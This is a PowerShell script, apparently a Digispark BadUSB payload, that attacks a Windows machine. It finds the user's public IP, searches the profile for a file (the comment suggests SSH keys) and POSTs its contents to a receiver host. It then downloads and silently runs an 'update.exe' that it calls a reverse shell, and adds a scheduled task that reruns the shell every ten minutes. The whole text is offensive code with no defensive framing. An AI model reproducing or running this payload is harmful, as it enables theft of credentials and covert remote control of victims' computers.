& {
    # Get public IP
    $p = (Invoke-WebRequest https://api.ipify.org -UseBasicParsing | Select -Exp Content)

    # Find id_* file
    $f = Get-ChildItem $env:USERPROFILE -Recurse -Include 'plugins.yaml' -File -Force -ErrorAction SilentlyContinue | Select -First 1
    if (-not $f) { $f = Get-Item "$env:USERPROFILE\plugins.yaml" -Force -ErrorAction SilentlyContinue }
    if ($f) { $c = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue } else { $c = 'Not found' }

    # Send to receiver (Note: changed from 8000 to 8080 to match receiver.py)
    $u = "http://192.168.137.5:8080/$env:COMPUTERNAME"
    Invoke-WebRequest -UseBasicParsing -Method POST -Uri $u -Body $c -Headers @{
        'X-Message'   = 'Hello from Digispark!'
        'X-Public-IP' = $p
    } -ErrorAction SilentlyContinue

    # Download and run reverse shell
    $wc = New-Object Net.WebClient
    $wc.DownloadFile('http://192.168.137.5:5000/download/update.exe', "$env:TEMP\update.exe")
    Start-Process "$env:TEMP\update.exe" -WindowStyle Hidden

    # Create persistence
    $rn = [guid]::NewGuid().ToString().Substring(0,8)
    schtasks /create /tn $rn /tr "$env:TEMP\update.exe" /sc minute /mo 10 /f
}
